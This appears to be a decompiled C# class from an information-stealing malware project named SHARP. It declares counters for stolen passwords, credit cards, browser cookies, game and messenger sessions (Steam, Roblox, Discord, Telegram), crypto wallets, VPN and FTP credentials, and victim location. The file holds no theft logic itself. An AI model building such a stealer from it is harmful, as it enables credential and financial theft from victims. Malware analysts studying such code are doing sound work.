﻿using System;

namespace SHARP
{
	// Token: 0x02000048 RID: 72
	internal class Counting
	{
		// Token: 0x040000AD RID: 173
		public static int Passwords = 0;

		// Token: 0x040000AE RID: 174
		public static int CreditCards = 0;

		// Token: 0x040000AF RID: 175
		public static int AutoFill = 0;

		// Token: 0x040000B0 RID: 176
		public static int Cookies = 0;

		// Token: 0x040000B1 RID: 177
		public static int History = 0;

		// Token: 0x040000B2 RID: 178
		public static int Bookmarks = 0;

		// Token: 0x040000B3 RID: 179
		public static int Downloads = 0;

		// Token: 0x040000B4 RID: 180
		public static int RobloxCookie = 0;

		// Token: 0x040000B5 RID: 181
		public static int EpicGames = 0;

		// Token: 0x040000B6 RID: 182
		public static int SteamCookie = 0;

		// Token: 0x040000B7 RID: 183
		public static int pia = 0;

		// Token: 0x040000B8 RID: 184
		public static int express = 0;

		// Token: 0x040000B9 RID: 185
		public static int cgv = 0;

		// Token: 0x040000BA RID: 186
		public static int jabber = 0;

		// Token: 0x040000BB RID: 187
		public static int Viber = 0;

		// Token: 0x040000BC RID: 188
		public static int blues = 0;

		// Token: 0x040000BD RID: 189
		public static int tlauncher = 0;

		// Token: 0x040000BE RID: 190
		public static int totalcmd = 0;

		// Token: 0x040000BF RID: 191
		public static int outlook = 0;

		// Token: 0x040000C0 RID: 192
		public static int upl = 0;

		// Token: 0x040000C1 RID: 193
		public static string country = "";

		// Token: 0x040000C2 RID: 194
		public static string reg = "";

		// Token: 0x040000C3 RID: 195
		public static string city = "";

		// Token: 0x040000C4 RID: 196
		public static int mine = 0;

		// Token: 0x040000C5 RID: 197
		public static int ds = 0;

		// Token: 0x040000C6 RID: 198
		public static int Telegram = 0;

		// Token: 0x040000C7 RID: 199
		public static int Discord = 0;

		// Token: 0x040000C8 RID: 200
		public static int VimeWorld = 0;

		// Token: 0x040000C9 RID: 201
		public static int FileZilla = 0;

		// Token: 0x040000CA RID: 202
		public static int FileGrabber = 0;

		// Token: 0x040000CB RID: 203
		public static int Wallets = 0;

		// Token: 0x040000CC RID: 204
		public static int NordVPN = 0;

		// Token: 0x040000CD RID: 205
		public static int OpenVPN = 0;

		// Token: 0x040000CE RID: 206
		public static int ProtonVPN = 0;

		// Token: 0x040000CF RID: 207
		public static int Steam = 0;
	}
}
